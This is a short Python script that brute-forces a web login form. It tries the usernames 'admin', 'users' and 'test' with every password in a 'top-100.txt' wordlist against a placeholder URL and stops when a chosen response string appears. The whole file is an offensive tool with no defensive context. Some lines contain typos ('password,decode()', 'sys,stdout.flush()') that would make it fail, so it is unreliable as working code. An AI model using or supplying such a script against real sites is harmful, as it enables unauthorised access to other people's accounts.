import requests 
import sys


target = "#change this web address"
usernames = [ "admin", "users", "test"]
passwords = "top-100.txt"
needle = "#Change this for web response"

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password,decode()))
			sys,stdout.flush()
			r = requests.post(target, data={"username":username, "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{}' found user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password was found for '{}'!".format(username))
